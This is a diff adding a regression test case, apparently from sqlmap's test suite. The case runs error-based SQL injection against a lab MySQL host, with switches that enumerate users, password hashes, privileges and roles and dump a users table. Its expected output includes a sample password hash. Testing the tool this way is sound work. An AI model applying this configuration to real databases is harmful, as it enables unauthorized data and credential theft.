@@ -3354,6 +3354,51 @@
             <item value="r'performed 112 queries'" console_output="True"/>
         </parse>
     </case>
+    <case name="Hex conversion data retrival">
+        <switches>
+            <url value="http://debiandev/sqlmap/mysql/get_int.php?id=1"/>
+            <threads value="4"/>
+            <tech value="E"/>
+            <extensiveFp value="True"/>
+            <getBanner value="True"/>
+            <getCurrentUser value="True"/>
+            <getCurrentDb value="True"/>
+            <getHostname value="True"/>
+            <hexConvert value="True"/>
+            <isDba value="True"/>
+            <getUsers value="True"/>
+            <getPasswordHashes value="True"/>
+            <getPrivileges value="True"/>
+            <getRoles value="True"/>
+            <getDbs value="True"/>
+            <getTables value="True"/>
+            <getColumns value="True"/>
+            <getCount value="True"/>
+            <dumpTable value="True"/>
+            <db value="testdb"/>
+            <tbl value="users"/>
+            <excludeSysDbs value="True"/>
+            <answers value="do you want to perform a dictionary-based attack against retrieved password hashes=N"/>
+        </switches>
+        <parse>
+            <item value="Title: MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause"/>
+            <item value="r'back-end DBMS: active fingerprint: MySQL &gt;= 5.1.12 and &lt; 5.5.0'"/>
+            <item value="banner:    '5.1.66-0+squeeze1'"/>
+            <item value="current user:    'root@localhost'"/>
+            <item value="current database:    'testdb'"/>
+            <item value="hostname:    'debian"/>
+            <item value="current user is DBA:    True"/>
+            <item value="r'database management system users \[.+'debian-sys-maint'@'localhost'.+'root'@''"/>
+            <item value="r'database management system users password hashes:.+root \[.+password hash: \*00E247AC5F9AF26AE0194B41E1E769DEE1429A29'"/>
+            <item value="r'database management system users privileges:.+debian-sys-maint.+\(administrator\).+root.+\(administrator\).+privilege: SUPER'"/>
+            <item value="r'database management system users roles:.+debian-sys-maint.+\(administrator\).+root.+\(administrator\).+role: SUPER'"/>
+            <item value="r'available databases \[.+information_schema.+mysql.+testdb'"/>
+            <item value="r'Database: testdb.+3 tables.+users'"/>
+            <item value="r'Database: testdb.+Table: users.+3 columns.+surname.+varchar\(1000\)'"/>
+            <item value="r'Database: testdb.+Table.+Entries.+users.+5'"/>
+            <item value="r'Database: testdb.+Table: users.+5 entries.+luther.+nameisnull.+'"/>
+        </parse>
+    </case>
     <case name="Custom GET parameter injection mark">
         <switches>
             <verbose value="2"/>
